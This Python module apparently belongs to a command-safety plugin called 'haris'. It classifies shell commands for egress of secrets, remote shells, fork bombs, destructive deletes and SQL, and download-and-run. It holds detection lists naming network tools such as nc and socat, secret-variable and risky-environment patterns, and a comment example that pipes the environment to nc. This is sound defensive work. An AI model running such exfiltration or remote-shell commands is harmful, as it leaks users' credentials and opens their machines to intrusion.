"""What a command does, judged by its action and its target, never by its name alone.

Every command the parser finds is checked, including those inside wrappers (env, sudo, nice,
timeout, xargs, find -exec, bash -c, eval, source, python -c, node -e, ssh, docker and kubectl
exec, git aliases ...), substitutions, pipelines and heredocs. Each check adds a Finding: a class
(what kind of action it is) and a plain reason. policy.py turns the classes into allow, pass,
ask or deny.
"""
from __future__ import annotations

import fnmatch
import os
import re
from dataclasses import dataclass

from . import secrets, shell
from .paths import PLUGIN_ROOT, UNKNOWN, data_home
from .targets import (  # noqa: F401  (the light helpers, kept here by name)
    ALLOW,
    ALWAYS_NO,
    ASK,
    CI_RUNNER_FILES,
    DENY,
    IGNORE_SCRIPTS_OFF,
    IGNORE_SCRIPTS_OFF_REASON,
    IGNORE_SCRIPTS_ON,
    LEVEL,
    LOCAL_HOSTS,
    NOT_APPROVABLE,
    PASS,
    TABLE,
    TAINT_RAISED,
    WRITE_REASONS,
    Arg,
    Ctx,
    Finding,
    Git,
    arg,
    joined_marks,
    rc_text,
    read_aliases,
    read_paths,
    targets,
    write_paths,
)

DEFAULT_PROTECTED = ["main", "master", "develop", "production", "trunk", "stable", "next", "release/*"]
RELEASE_LINE = re.compile(r"^v?\d+(?:\.\d+)*\.x$")  # a major version's own branch: 4.x, 5.x, v4.x (#227)
SECRET_VAR = re.compile(r"(?i)(?:token|secret|passw(?:or)?d|passphrase|api_?key|access_?key|private_?key"
                        r"|credential|auth|session_?key|client_?secret|_pat$|^pat_)")
RISKY_ENV = {"LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "GIT_SSH_COMMAND", "GIT_SSH", "GIT_EXEC_PATH",
             "GIT_ASKPASS", "SSH_ASKPASS", "BASH_ENV", "ENV", "PROMPT_COMMAND", "PERL5OPT", "RUBYOPT",
             "GIT_CONFIG_PARAMETERS", "GIT_CONFIG_COUNT", "GIT_EXTERNAL_DIFF", "GIT_PROXY_COMMAND"}
GIT_EXEC_KEYS = re.compile(r"(?i)^(?:core\.(?:sshcommand|pager|editor|fsmonitor|hookspath|gitproxy|askpass)"
                           r"|credential\..*helper|credential\.helper|.*\.(?:command|textconv|cmd|clean|smudge"
                           r"|process)|diff\.external|sequence\.editor|uploadpack\..*|receivepack\..*"
                           r"|protocol\..*\.allow|gpg\.program|gpg\..*\.program|alias\..*|include\.path"
                           r"|includeif\..*)$")
SQL_DESTRUCTIVE = re.compile(r"(?is)\b(?:drop\s+(?:database|schema|table|collection|index|view|user|role)"
                             r"|truncate\s+(?:table\s+)?\w|delete\s+from\s+[\w.\"`]+\s*(?:;|$|\"|')"
                             r"|alter\s+table\s+\S+\s+drop|flushall|flushdb|dropdatabase\s*\(|\.drop\s*\(\s*\))")
SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "ash", "mksh", "fish", "busybox"}
INTERPRETERS = SHELLS | {"python", "python3", "node", "ruby", "perl", "php", "pwsh", "powershell",
                         "osascript",
                         "lua", "rscript", "tclsh", "deno", "bun"}
NETWORK = {"curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp", "rsync", "ftp",
           "http", "https", "xh", "dig", "nslookup", "host", "ping", "ping6", "traceroute", "whois", "mail",
           "mailx", "sendmail", "mutt", "aws", "gsutil", "rclone", "gh", "git", "openssl", "nmap", "aria2c"}
PRINTERS = {"echo", "printf", "print"}
TAG_LIKE = re.compile(r"^(?:refs/tags/.+|v?\d+\.\d+(?:\.\d+)?(?:[-+.][\w.]+)?)$")
HOST_ARG = re.compile(r"^(?:[\w.-]+@)?[\w.-]{2,}:(?!//)")  # host:path, but not C:\ or a URL


@dataclass
class Stage:
    """What one pipeline stage hands to the next."""
    text: str | None = None         # known literal output (echo, printf, a heredoc)
    downloads: bool = False         # its output is a download
    secret: bool = False            # its output holds a secret that was read
    paths_root: str | None = None   # it lists paths under this folder (find, ls, git ls-files)
    filtered: bool = True           # those paths are a selection, not everything
    environ: bool = False           # it prints the environment (env, printenv, set, export)


# ---------------------------------------------------------------- walking the parsed command


def classify(command: str, ctx: Ctx) -> list[Finding]:
    try:
        walk(shell.parse(command), ctx)
    except shell.ParseError as exc:
        ctx.add("unparsed", f"haris could not read this command ({exc}), so it cannot tell what it does.")
    except RecursionError:
        ctx.add("unparsed", "haris could not read this command (it is nested too deeply).")
    return ctx.findings


def walk(nodes: list, ctx: Ctx) -> None:
    for n in nodes:
        pipeline(n, ctx)


def pipeline(p: shell.Pipeline, ctx: Ctx) -> None:
    if len(p.stages) == 1:
        node(p.stages[0], ctx, None)
        return
    prev: Stage | None = None
    secret = False
    for stage in p.stages:
        sub = ctx.child(marks=True)
        prev = node(stage, sub, prev) or Stage()
        # The whole environment holds every token the session has: it is as secret as one named. A
        # secret stays secret down the pipe: `env | gzip | nc host 1` still sends it (#350).
        secret = secret or prev.secret or prev.environ or "secret" in sub.marks
        prev.secret = secret
        prev.downloads = prev.downloads or "download" in sub.marks
        ctx.marks |= sub.marks


def node(n, ctx: Ctx, stdin: Stage | None) -> Stage | None:
    if isinstance(n, shell.Simple):
        return simple(n, ctx, stdin)
    if isinstance(n, shell.Pipeline):
        pipeline(n, ctx)
        return Stage()
    if isinstance(n, shell.Group):
        inner = ctx.child() if n.subshell else ctx
        if n.each and ctx.unroll_budget[0] >= len(n.each):
            # judged once per word, for what each would do; a `break` may stop at any word, so after
            # the loop its variables and folder are not known
            ctx.unroll_budget[0] -= len(n.each)
            walk(n.body[:1], inner)  # the list itself
            each, moved = inner.child(), False
            for body in n.each:
                walk(body, each)
                moved = moved or each.cwd != inner.cwd
            inner.forget()
            if moved:
                inner.cwd = None
        else:
            walk(n.body, inner)
        for r in n.redirects:
            redirect(r, ctx, [])
        return Stage(secret="secret" in inner.marks)
    if isinstance(n, shell.Function):
        ctx.funcs[n.name] = n
        if calls_itself(n.body, n.name):
            ctx.add("fork-bomb", f"The function `{n.name}` starts copies of itself without end (a fork "
                                 f"bomb), "
                                 "which freezes the computer.")
        node(n.body, ctx.child(), None)
        return Stage()
    return Stage()


def calls_itself(body, name: str) -> bool:
    """A function that runs itself in a pipe or in the background: the classic fork bomb."""
    found = False

    def visit(x, risky: bool) -> None:
        nonlocal found
        if isinstance(x, shell.Simple) and x.words and x.words[0].plain() == name and risky:
            found = True
        elif isinstance(x, shell.Pipeline):
            for s in x.stages:
                visit(s, risky or x.background or len(x.stages) > 1)
        elif isinstance(x, shell.Group):
            for y in x.body:
                visit(y, risky)

    visit(body, False)
    return found


# ---------------------------------------------------------------- words


def var_value(name: str, ctx: Ctx) -> str:
    if name.startswith("?"):
        return UNKNOWN
    if name in ctx.vars:
        return ctx.vars[name]
    if name.isdigit() or name in ("@", "*", "#"):
        if ctx.args is None:
            return UNKNOWN
        if name.isdigit():
            i = int(name)
            return ctx.args[i] if i < len(ctx.args) else ""
        if name == "#":
            return str(max(len(ctx.args) - 1, 0))
        return " ".join(ctx.args[1:])
    if ctx.vars_lost:
        return UNKNOWN
    if name == "HOME":
        return ctx.where.home
    if name == "PWD":
        return ctx.cwd if ctx.cwd is not None else UNKNOWN
    if name in ("USER", "LOGNAME"):
        return os.path.basename(ctx.where.home)
    if name == "TMPDIR":
        return os.environ.get("TMPDIR") or "/tmp"
    return UNKNOWN


def expand(word: shell.Word, ctx: Ctx) -> list[Arg]:
    """A word's possible values (brace expansion can make several); its substitutions are checked."""
    text, marks, braces = [], set(), False
    for part in word.parts:
        if part.kind == "lit":
            text.append(part.text)
            braces = braces or (not part.quoted and "{" in part.text and "}" in part.text)
        elif part.kind == "tilde":
            text.append(ctx.where.home if not part.text else os.path.expanduser("~" + part.text))
        elif part.kind == "var":
            value = var_value(part.text, ctx)
            if value == UNKNOWN and part.text in CI_RUNNER_FILES and len(word.parts) == 1:
                marks.add("ci-file:" + part.text)  # the whole word is the runner's file (#142)
            text.append(value)
        elif part.kind == "arith":
            text.append("1")
        elif part.kind == "sub":
            marks |= substitution(part, ctx)
            if part.how in ("<(", ">("):
                text.append("/dev/fd/63")
                marks.add("procsub")
            else:
                text.append(UNKNOWN)
    value = "".join(text)
    values = expand_braces(value) if braces else [value]
    return [arg(v, marks) for v in values]


def substitution(part: shell.Part, ctx: Ctx) -> set[str]:
    sub = ctx.child(marks=True)
    walk(part.script or [], sub)
    return set(sub.marks)


def expand_braces(value: str, limit: int = 64) -> list[str]:
    m = re.search(r"\{([^{}]*)\}", value)
    if not m or ("," not in m.group(1) and ".." not in m.group(1)):
        return [value]
    inner = m.group(1)
    seq = re.fullmatch(r"(-?\d+)\.\.(-?\d+)", inner)
    if seq:
        a, b = int(seq.group(1)), int(seq.group(2))
        step = 1 if b >= a else -1
        options_ = [str(i) for i in range(a, b + step, step)][:limit]
    else:
        options_ = inner.split(",")
    out: list[str] = []
    for option in options_:
        out += expand_braces(value[:m.start()] + option + value[m.end():], limit)
        if len(out) >= limit:
            break
    return out[:limit]


def var_names(word: shell.Word) -> list[str]:
    return [p.text.lstrip("?") for p in word.parts if p.kind == "var"]


# ---------------------------------------------------------------- simple commands


def simple(cmd: shell.Simple, ctx: Ctx, stdin: Stage | None) -> Stage | None:
    if cmd.data:
        for w in cmd.words:
            expand(w, ctx)
        return None
    argv: list[Arg] = []
    for w in cmd.words:
        argv += expand(w, ctx)
    assigns = []
    for name, value in cmd.assigns:
        expanded = expand(value, ctx)
        assigns.append((name, expanded[0] if expanded else arg("")))
    for name, value in assigns:
        if name in RISKY_ENV or (name == "NODE_OPTIONS" and re.search(r"--(?:require|import|loader)|-r\b",
                                                                      value)):
            ctx.add("risky", f"Setting {name} changes which code the next program loads or runs.")
    if not argv:
        for name, value in assigns:
            ctx.vars[name] = str(value)
        for r in cmd.redirects:
            redirect(r, ctx, [])
        ctx.add("read", "Sets a variable.")
        return None
    heredoc = None
    secret_input = False
    for r in cmd.redirects:
        before = len(ctx.findings)
        text = redirect(r, ctx, argv)
        secret_input = secret_input or any(f.cls == "secret-read" for f in ctx.findings[before:])
        if text is not None:
            heredoc = text
    if secret_input:
        stdin = Stage(secret=True)
    if heredoc is not None:
        stdin = Stage(text=heredoc if UNKNOWN not in heredoc else None,
                      secret="secret" in getattr(heredoc, "marks", ()))
    program = os.path.basename(argv[0]).lower()
    if program in PRINTERS:
        into = printed_into(cmd, ctx)
        for w in cmd.words[1:]:
            for name in var_names(w):
                if SECRET_VAR.search(name):
                    ctx.add("secret-read", f"Writes ${name}, which looks like a secret, into {into}."
                            if into else f"Prints ${name}, which looks like a secret, into the conversation.")
    ctx.prefix = {name: str(value) for name, value in assigns}
    try:
        stage = run(argv, ctx, stdin)
    finally:
        ctx.prefix = {}
    downloads = (stage is not None and stage.downloads) or program in DOWNLOADERS
    for r in cmd.redirects:
        if r.body is None and r.target and r.op in (">", ">>", ">|", "&>", "&>>"):
            values_ = expand(r.target, ctx)
            if not values_ or UNKNOWN in values_[0]:
                continue
            path = ctx.where.resolve(values_[0], ctx.cwd)
            if not path:
                continue
            if downloads:
                ctx.downloaded.add(path)  # `curl URL > file` saves a download like `curl -o file`
            elif stage is not None and stage.text is not None and UNKNOWN not in stage.text:
                if os.path.basename(path) == ".npmrc" and (IGNORE_SCRIPTS_OFF.search(stage.text) or (
                        r.op in (">", ">|", "&>") and IGNORE_SCRIPTS_ON.search(rc_text(path))
                        and not IGNORE_SCRIPTS_ON.search(stage.text))):
                    ctx.add("risky", IGNORE_SCRIPTS_OFF_REASON.format(path=ctx.show(path)))
                before = ctx.written.get(path, "") if r.op in (">>", "&>>") else ""
                ctx.written[path] = before + stage.text + "\n"
            else:
                ctx.written.pop(path, None)
    return stage


def printed_into(cmd: shell.Simple, ctx: Ctx) -> str:
    """The file a printer's output goes to (`echo ... >> .npmrc`), said plainly; "" for the conversation."""
    for r in cmd.redirects:
        if r.body is None and r.target and r.op in (">", ">>", ">|", "&>", "&>>") and r.fd in ("", "1"):
            values_ = expand(r.target, ctx)
            path = ctx.where.resolve(values_[0], ctx.cwd) if values_ and UNKNOWN not in values_[0] else None
            if not path or ctx.where.place(path) == "null":
                return ""
            shown = ctx.show(path)
            if path.startswith(ctx.where.root + "/") and \
                    ctx.git.try_run("ls-files", "--error-unmatch", "--", path) is not None:
                return f"{shown}, which git tracks (it would be committed)"
            return shown
    return ""


DOWNLOADERS = {"curl", "wget", "http", "https", "xh", "aria2c", "fetch"}


def h_coproc(argv, ctx, stdin):
    return run(argv[1:], ctx, stdin)


def redirect(r: shell.Redirect, ctx: Ctx, argv: list[Arg]) -> Arg | None:
    """Check a redirection; returns the text it feeds in (heredoc, here-string), if any."""
    if r.body is not None:
        values_ = expand(r.body, ctx)
        return values_[0] if values_ else arg("")
    values_ = expand(r.target, ctx) if r.target else []
    target = values_[0] if values_ else arg(UNKNOWN)
    if r.op == "<<<":
        return target
    if r.op == "<&" or (r.op == ">&" and (target.isdigit() or target == "-")):
        return None
    if target.startswith(("/dev/tcp/", "/dev/udp/")):
        host = target.split("/")[3] if target.count("/") >= 3 else "?"
        program = os.path.basename(argv[0]).lower() if argv else ""
        if program in INTERPRETERS:
            ctx.add("remote-shell", f"Connects a shell to {host} over the network: whoever is there can run "
                                    "commands on this computer.")
        else:
            ctx.add("egress", f"Sends data to {host} over a raw network connection.")
        return None
    if r.op == "<":
        read_paths([target], ctx, "reads")
    else:
        write_paths([target], ctx, "writes to")
    return None


def run(argv: list[Arg], ctx: Ctx, stdin: Stage | None) -> Stage | None:
    """Check one command once its words are known; wrappers call this for the command they run."""
    if not argv:
        return None
    first = argv[0]
    if UNKNOWN in first:
        if "download" in first.marks:
            ctx.add("download-run", "Runs a program it downloads, without you seeing it first.")
        else:
            ctx.add("dynamic", "The command to run is only known when it runs (it comes from a variable or "
                               "another command), so haris cannot check it.")
        return None
    program = os.path.basename(first).lower()
    if program.endswith(".exe"):
        program = program[:-4]
    ctx.executed.append([program, *argv[1:]])
    if str(first) in ctx.aliases and "/" not in first:
        body = ctx.aliases.pop(str(first))  # an alias is not expanded inside its own body
        try:
            return shell_string(arg(" ".join([body, *(shquote(a) for a in argv[1:])]), joined_marks(argv)),
                                ctx, [], f"alias {first}")
        finally:
            ctx.aliases[str(first)] = body
    if program in ctx.funcs:
        ctx.add("read", f"Runs the function {program} (checked where it is defined).")
        ctx.forget()
        return None
    if program in ASSIGNERS:
        assigned(program, argv, ctx)
    if "/" in first or first.startswith("~"):
        path = ctx.where.resolve(first, ctx.cwd)
        if path and path in ctx.downloaded:
            ctx.add("download-run", f"Runs {ctx.show(path)}, which this command just downloaded.")
            return None
        if path and path in ctx.written:
            shebang = ctx.written[path].lstrip().split("\n", 1)[0]
            return written_run(program, path, ctx, argv[1:], shebang if shebang.startswith("#!") else "sh")
        if path and (path.startswith(PLUGIN_ROOT + "/") or HARIS_HELPER.search(path)):
            return own_helper(argv, ctx, installed_helper(path, ctx))
        if path and MIZAN_HELPER.search(path):
            return mizan_helper(argv, ctx)
    family = program
    m = re.match(r"^(python|pypy|pip|ruby|perl|php|node)[\d.]+$", program)
    if m:
        family = m.group(1) if m.group(1) != "pypy" else "pypy3"
    handler = HANDLERS.get(family)
    if handler:
        return handler([arg(family, first.marks), *argv[1:]], ctx, stdin)
    if program in READERS:
        return reader(program, argv, ctx, stdin)
    if program == "pre-commit" and len(argv) > 1 and argv[1] in ("install", "init-templatedir"):
        return pre_commit_install(argv, ctx)
    if program in HOOK_INSTALLERS:
        return hook_installer(program, argv, ctx)
    if program in RUNNERS:
        return project_run(ctx, f"Runs {program} in the project.")
    if script_runner(program, first, ctx):
        return script_runner_run(program, argv, ctx, stdin)
    return generic(argv, ctx, stdin)


_SCRIPT_RUNNERS: dict[tuple[str, float], set[str]] = {}


def script_runners(root: str) -> set[str]:
    """Programs that start one of package.json's scripts (`"unit": "borp"`), leaving out release scripts."""
    path = os.path.join(root, "package.json")
    try:
        key = (path, os.stat(path).st_mtime)
    except OSError:
        return set()
    if key not in _SCRIPT_RUNNERS:
        import json  # only for a program haris does not know, in a folder with a package.json
        try:
            with open(path, encoding="utf-8") as fh:
                scripts = json.load(fh).get("scripts") or {}
        except (OSError, ValueError, AttributeError):
            scripts = {}
        found = set()
        for name, body in scripts.items() if isinstance(scripts, dict) else ():
            if not isinstance(body, str) or (RELEASE_WORDS.search(name) and name not in RUN_WORDS):
                continue
            for part in re.split(r"&&|\|\||;|\|", body):
                words = [w for w in part.split() if not re.match(r"^[A-Za-z_]\w*=", w)]
                if words and words[0] in ("cross-env", "cross-env-shell"):
                    words = words[1:]
                if words:
                    found.add(os.path.basename(words[0]))
        _SCRIPT_RUNNERS[key] = found
    return _SCRIPT_RUNNERS[key]


def script_runner(program: str, first: str, ctx: Ctx) -> bool:
    """A program from the project's node_modules/.bin that its package.json scripts run: the project's
    own test, lint or coverage tool, allowed like `npm run` of that script (#221)."""
    root = ctx.where.root
    binary = os.path.join(root, "node_modules", ".bin", program)
    if "/" in first and ctx.where.resolve(first, ctx.cwd) not in (binary, os.path.realpath(binary)):
        return False
    return os.path.exists(binary) and program in script_runners(root)


# Words a runner may be handed that are themselves commands (`c8 rm -rf x` runs rm); harmless names
# that are also haris handlers (watch, init, start ...) are left out.
NOT_COMMANDS = {"watch", "init", "start", "open", "format", "at", "date", "set", "task", "install", "just",
                "make", "history", "code", "shift", "local", "export", "test"}


def script_runner_run(program: str, argv: list[Arg], ctx: Ctx, stdin: Stage | None) -> Stage | None:
    for i, a in enumerate(argv[1:], 1):
        if a.startswith("-") or "=" in a:
            continue
        name = os.path.basename(a).lower()
        if (name in HANDLERS and name not in NOT_COMMANDS) or name in INTERPRETERS:
            return run(argv[i:], ctx, stdin)  # the runner wraps a command: judge that command
        if " " in a or UNKNOWN in a:
            return generic(argv, ctx, stdin)
    return project_run(ctx, f"Runs {program}, the project's own tool from its package.json scripts, in the "
                            "project.")


def h_cross_env(argv, ctx, stdin):
    """cross-env NAME=value ... CMD: sets variables like `env`, then runs CMD (#221)."""
    rest = argv[1:]
    while rest and re.match(r"^[A-Za-z_]\w*=", rest[0]):
        if rest[0].split("=", 1)[0] in RISKY_ENV:
            ctx.add("risky", f"Setting {rest[0].split('=', 1)[0]} changes which code the next program loads "
                             "or runs.")
        rest = rest[1:]
    if not rest:
        ctx.add("read", f"{argv[0]} without a command does nothing.")
        return Stage()
    if argv[0] == "cross-env-shell":
        return shell_string(arg(" ".join(rest), joined_marks(rest)), ctx, [], "cross-env-shell")
    return run(rest, ctx, stdin)


def pre_commit_install(argv: list[Arg], ctx: Ctx) -> Stage:
    """`pre-commit install` writes git hooks that later run whatever .pre-commit-config.yaml says (#140)."""
    opts, _ = options(argv[2:], {"-t", "--hook-type", "-c", "--config"})
    hooks = [str(h) for h in values(opts, "-t", "--hook-type")] or ["pre-commit"]
    where = "the git template folder" if argv[1] == "init-templatedir" else \
        ", ".join(f".git/hooks/{h}" for h in hooks)
    ctx.add("git-internal", f"Installs a git hook ({where}) that runs whatever .pre-commit-config.yaml says "
                            "on later git commands, without asking.")
    return Stage()


HOOK_INSTALLERS = {"husky", "lefthook", "simple-git-hooks"}


def hook_installer(program: str, argv: list[Arg], ctx: Ctx) -> Stage:
    """husky (v9: `husky`, `husky init`), `lefthook install`, simple-git-hooks: like `pre-commit install`,
    they make git run project scripts on later git commands (husky sets core.hooksPath) (#217)."""
    sub = next((str(a) for a in argv[1:] if not a.startswith("-")), "")
    if any(a in ("-v", "--version", "-h", "--help") for a in argv[1:]):
        ctx.add("read", f"Shows {program} information.")
    elif program == "lefthook" and sub not in ("install", "add"):
        ctx.add("exec", f"Runs `lefthook {sub}`.")
    elif program == "husky" and sub == "uninstall":
        ctx.add("exec", "Removes husky's git hooks.")
    else:
        what = "sets core.hooksPath to .husky" if program == "husky" else "writes git hooks into .git/hooks"
        ctx.add("git-internal", f"`{' '.join([program, sub]).strip()}` {what}: git then runs the project's "
                                "hook scripts on later git commands, without asking.")
    return Stage()


ASSIGNERS = {"read", "printf", "mapfile", "readarray", "getopts", "let"}


def assigned(program: str, argv: list[Arg], ctx: Ctx) -> None:
    """Builtins that set variables: haris does not know the new values, so it forgets the old ones."""
    if program == "printf" and not any(a == "-v" or (a.startswith("-v") and len(a) > 2) for a in argv[1:]):
        return
    names = {"REPLY", "MAPFILE", "OPTARG", "OPTIND"}
    for a in argv[1:]:
        m = re.match(r"-?v?([A-Za-z_]\w*)", a)
        if m:
            names.add(m.group(1))
    for name in names:
        ctx.vars[name] = UNKNOWN


def generic(argv: list[Arg], ctx: Ctx, stdin: Stage | None) -> Stage:
    program = os.path.basename(argv[0])
    ctx.add("exec", f"Runs {program}; haris does not know it, so Claude Code's own permission rules apply.")
    for a in argv[1:]:
        if a.startswith("-") or UNKNOWN in a:
            continue
        path = ctx.where.resolve(a.split("=", 1)[-1], ctx.cwd)
        if path and os.path.isfile(path) and ctx.where.place(path) == "secret":
            ctx.add("secret-read", f"Gives {ctx.show(path)}, which holds secrets, to {program}.", path)
    network_leak(program.lower(), argv, ctx, stdin)
    return Stage()


def network_leak(program: str, argv: list[Arg], ctx: Ctx, stdin: Stage | None) -> None:
    if program not in NETWORK:
        return
    if any("secret" in a.marks for a in argv[1:]):
        ctx.add("egress-secret", f"Sends a secret it reads (a key or a credentials file) over the network "
                                 f"with "
                                 f"{program}.")
    elif stdin is not None and stdin.secret:
        ctx.add("egress-secret", f"Pipes a secret into {program}, which sends it over the network.")


# ---------------------------------------------------------------- options and targets


def options(args: list[Arg], with_arg=frozenset(), first_stops: bool = False) -> tuple[list, list[Arg]]:
    """(options as (name, value) pairs, positionals); short flags may be combined, `--` ends options."""
    opts: list[tuple[str, Arg | None]] = []
    pos: list[Arg] = []
    i = 0
    while i < len(args):
        a = args[i]
        if first_stops and pos:
            pos += args[i:]
            break
        if a == "--":
            pos += args[i + 1:]
            break
        if a.startswith("--") and len(a) > 2:
            name, eq, val = a.partition("=")
            if eq:
                opts.append((name, arg(val, a.marks)))
            elif name in with_arg and i + 1 < len(args):
                opts.append((name, args[i + 1]))
                i += 1
            else:
                opts.append((name, None))
        elif a.startswith("-") and len(a) > 1 and not re.fullmatch(r"-\d+(?:\.\d+)?", a):
            if a in with_arg:
                opts.append((a, args[i + 1] if i + 1 < len(args) else None))
                i += 2
                continue
            j = 1
            while j < len(a):
                flag = "-" + a[j]
                if flag in with_arg:
                    val = arg(a[j + 1:], a.marks) if a[j + 1:] else None
                    if val is None and i + 1 < len(args):
                        val = args[i + 1]
                        i += 1
                    opts.append((flag, val))
                    break
                opts.append((flag, None))
                j += 1
        else:
            pos.append(a)
        i += 1
    return opts, pos


def has(opts: list, *names: str) -> bool:
    return any(o[0] in names for o in opts)


def values(opts: list, *names: str) -> list[Arg]:
    return [v for n, v in opts if n in names and v is not None]



def delete_paths(values_: list[Arg], ctx: Ctx, verb: str = "deletes") -> None:
    where = ctx.where
    for value in values_:
        for path, contents in targets(value, ctx):
            if contents is not None:
                if where.critical(contents):
                    ctx.add("destroy", f"{verb.capitalize()} everything in {ctx.show(contents)}: far more "
                                       f"than "
                                       "one project, and it cannot be undone.", contents)
                    continue
                if contents == where.root:
                    ctx.add("discard", f"{verb.capitalize()} every file in the project.", contents)
                    continue
                path = contents
            if path is None:
                ctx.add("unknown-target", f"{verb.capitalize()} a path that is only known when it runs, so "
                                          f"haris "
                                          "cannot tell what would be lost.")
                continue
            shown = ctx.show(path)
            if where.critical(path) or path == where.root:
                what = ("the whole project" if path == where.root else
                        "your home folder" if path == where.home else path)
                ctx.add("destroy", f"{verb.capitalize()} {what}. That cannot be undone.", path)
                continue
            held = where.holds(path)
            if held in ("self", "persistence"):
                cls, text = WRITE_REASONS[held]
                ctx.add(cls, text.format(verb=verb.capitalize(), path=shown), path)
                continue
            place = where.place(path)
            if place == "git" and path in (where.root + "/.git", where.root + "/.git/objects",
                                           where.root + "/.git/refs"):
                ctx.add("discard", f"{verb.capitalize()} {shown}: the project's git history.", path)
            elif place == "project":
                ctx.add("delete", f"{verb.capitalize()} {shown} in the project.", path)
            elif place in ("home", "outside", "memory"):
                ctx.add("delete-outside", f"{verb.capitalize()} {shown}, outside the project.", path)
            elif place != "null":
                cls, text = WRITE_REASONS[place]
                ctx.add(cls, text.format(verb=verb.capitalize(), path=shown), path)


# ---------------------------------------------------------------- read-only programs

# name: (what its file arguments are, short options that take a value, first positional is a pattern)
READERS = {
    "cat": ("read", "", False), "tac": ("read", "", False), "nl": ("read", "bvwsd", False),
    "head": ("read", "nc", False), "tail": ("read", "ncs", False), "wc": ("read", "", False),
    "sort": ("read", "kotST", False), "uniq": ("read", "fsw", False), "cut": ("read", "dfcb", False),
    "paste": ("read", "d", False), "join": ("read", "12teoj", False), "comm": ("read", "", False),
    "cmp": ("read", "in", False), "diff": ("read", "CUIxXFL", False), "colordiff": ("read", "", False),
    "grep": ("read", "efABCmdD", True), "egrep": ("read", "efABCmdD", True), "fgrep": ("read", "efABCmdD",
                                                                                       True),
    "rg": ("read", "efABCmgtTMj", True), "ag": ("read", "ABCmGg", True), "ack": ("read", "ABCm", True),
    "jq": ("read", "f", True), "yq": ("read", "", True), "xxd": ("read", "cglsno", False),
    "od": ("read", "AjNtw", False), "hexdump": ("read", "efns", False), "strings": ("read", "nt", False),
    "md5sum": ("read", "", False), "sha1sum": ("read", "", False), "sha256sum": ("read", "", False),
    "sha512sum": ("read", "", False), "shasum": ("read", "a", False), "cksum": ("read", "", False),
    "b2sum": ("read", "", False), "md5": ("read", "", False), "base64": ("read", "wbio", False),
    "less": ("read", "", False), "more": ("read", "", False), "bat": ("read", "lrH", False),
    "batcat": ("read", "lrH", False), "column": ("read", "stco", False), "fold": ("read", "w", False),
    "fmt": ("read", "w", False), "rev": ("read", "", False), "iconv": ("read", "fto", False),
    "expand": ("read", "t", False), "unexpand": ("read", "t", False), "tsort": ("read", "", False),
    "look": ("read", "t", True), "diffstat": ("read", "", False), "shuf": ("read", "no", False),
    "nm": ("read", "", False), "objdump": ("read", "", False), "otool": ("read", "", False),
    "ldd": ("read", "", False), "zcat": ("read", "", False), "bzcat": ("read", "", False),
    "xzcat": ("read", "", False), "zgrep": ("read", "efABC", True),
    "ls": ("meta", "IwT", False), "tree": ("meta", "LPIo", False), "stat": ("meta", "fc", False),
    "file": ("meta", "mF", False), "du": ("meta", "dBtX", False), "df": ("meta", "tBx", False),
    "realpath": ("meta", "", False), "readlink": ("meta", "", False), "exa": ("meta", "LI", False),
    "eza": ("meta", "LI", False), "lsd": ("meta", "", False), "fd": ("meta", "edtETxXcjS", True),
    "fdfind": ("meta", "edtETxXcjS", True), "cloc": ("meta", "", False), "tokei": ("meta", "", False),
    "scc": ("meta", "", False),
    "locate": ("text", "", False), "basename": ("text", "s", False), "dirname": ("text", "", False),
    "echo": ("text", "", False), "printf": ("text", "v", False), "print": ("text", "", False),
    "true": ("text", "", False), "false": ("text", "", False), "test": ("text", "", False),
    "[": ("text", "", False), "sleep": ("text", "", False), "seq": ("text", "fs", False),
    "expr": ("text", "", False), "whoami": ("text", "", False), "id": ("text", "", False),
    "groups": ("text", "", False), "uname": ("text", "", False), "uptime": ("text", "", False),
    "pwd": ("text", "", False), "which": ("text", "", False), "whereis": ("text", "", False),
    "type": ("text", "", False), "printenv": ("text", "", False), "nproc": ("text", "", False),
    "arch": ("text", "", False), "locale": ("text", "", False), "tput": ("text", "", False),
    "cal": ("text", "", False), "ps": ("text", "opUuCGgtk", False), "free": ("text", "", False),
    "vmstat": ("text", "", False), "tr": ("text", "", False), "lsof": ("text", "pcuidg", False),
    "pgrep": ("text", "ugUGPstF", False), "jobs": ("text", "", False), "wait": ("text", "", False),
    "read": ("text", "pdntu", False), "set": ("text", "o", False), "shopt": ("text", "", False),
    "unset": ("text", "", False), "exit": ("text", "", False), "return": ("text", "", False),
    "shift": ("text", "", False), "break": ("text", "", False), "continue": ("text", "", False),
    ":": ("text", "", False), "hash": ("text", "", False), "ulimit": ("text", "", False),
    "umask": ("text", "", False), "getconf": ("text", "", False), "tty": ("text", "", False),
    "sw_vers": ("text", "", False), "lsblk": ("text", "o", False), "numfmt": ("text", "", False),
    "factor": ("text", "", False), "bc": ("text", "", False), "help": ("text", "", False),
    "man": ("text", "", False), "tldr": ("text", "", False), "w": ("text", "", False),
    "who": ("text", "", False), "last": ("text", "", False), "top": ("text", "dnpu", False),
    "htop": ("text", "", False), "getent": ("text", "", False), "env_parallel": ("text", "", False),
    "dig": ("text", "", False), "nslookup": ("text", "", False), "host": ("text", "", False),
    "ping": ("text", "c", False), "ifconfig": ("text", "", False), "netstat": ("text", "", False),
    "ss": ("text", "", False), "ip": ("text", "", False), "printf_": ("text", "", False),
}
NETWORK_READERS = {"dig", "nslookup", "host", "ping"}
WRITING_OPTIONS = {"sort": ("-o", "--output"), "tree": ("-o",), "base64": ("-o", "--output"),
                   "iconv": ("-o", "--output"), "shuf": ("-o", "--output")}
READER_LONG = {"--output", "--regexp", "--file", "--max-count", "--glob", "--type", "--context",
               "--after-context",
               "--before-context", "--indent", "--exclude", "--include", "--key", "--field-separator",
               "--delimiter", "--fields", "--lines", "--bytes", "--type-not", "--iglob", "--max-depth"}


def reader(program: str, argv: list[Arg], ctx: Ctx, stdin: Stage | None) -> Stage:
    kind, short, pattern_first = READERS[program]
    with_arg = {"-" + c for c in short} | READER_LONG
    if program == "jq":
        argv = jq_args(argv)
    if program in ("head", "tail"):  # `head -50 x`: the old form of -n 50, not a file (#137)
        argv = [a for a in argv if not re.fullmatch(r"-\d+", a)]
    opts, pos = options(argv[1:], with_arg)
    write_paths(values(opts, *WRITING_OPTIONS.get(program, ())), ctx)
    if program in ("uniq", "xxd") and len(pos) > 1:
        write_paths(pos[1:2], ctx)
        pos = pos[:1]
    if program == "yq" and has(opts, "-i", "--inplace"):
        write_paths(pos[1:], ctx, "edits")
